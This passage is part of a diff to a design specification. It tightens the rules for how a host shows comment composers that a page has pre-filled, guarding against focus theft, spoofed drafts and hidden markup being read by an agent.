-    typing: what they type for the page must not land in a postable comment), and doesn't send on
-    Enter until the person has focused or edited it themselves: Send is a click until then. It is
-    a view the content brought (§6's guard): no press for 500 ms after it opens, Send not focused,
-    beside the frame where it can.
-  - It says the text is the page's ("Suggested by this page", or the page's name), drawn by the
-    host outside the frame, until the person edits it, and never shows it as one of their own
-    drafts: the host's own list of drafts is how a person finds theirs, not the frame's markers,
-    which a page can draw too.
-  - The draft's view (P107) and the composer put nothing one click away that posts, submits or
-    discards.
-  - Render a page-drafted comment as plain text, or show the person before Send what readers will
-    see: markup a markdown renderer hides (an HTML comment, a link definition) is still read by an
-    agent. Show the anchor's label and quote as isolated text (`<bdi>`, `dir="auto"`), and hand
-    them to a model only as the page's words.
+    separate suggestion that takes no focus.
+  - A composer the page filled takes no focus when it opens (what the person types for the page
+    must not land in a postable comment), and doesn't send on Enter until the person has focused
+    or edited it. It is a view the content brought (§6's guard): no press for 500 ms, Send not
+    focused, beside the frame where it can.
+  - It says the text is the page's ("Suggested by this page"), drawn by the host outside the frame,
+    until the person edits it, and never shows it as one of their own drafts: the host's own list
+    of drafts, not the frame's markers (which a page can draw), is how a person finds theirs.
+  - Nothing one click away in the draft's view (P107) or the composer posts, submits or discards.
+  - Render a page-drafted comment as plain text, or show before Send what readers will see: markup
+    a markdown renderer hides (an HTML comment, a link definition) is still read by an agent. Show
+    the anchor's label and quote as isolated text (`<bdi>`, `dir="auto"`), and hand them to a model
+    only as the page's words.
 
 **Not guaranteed**
 
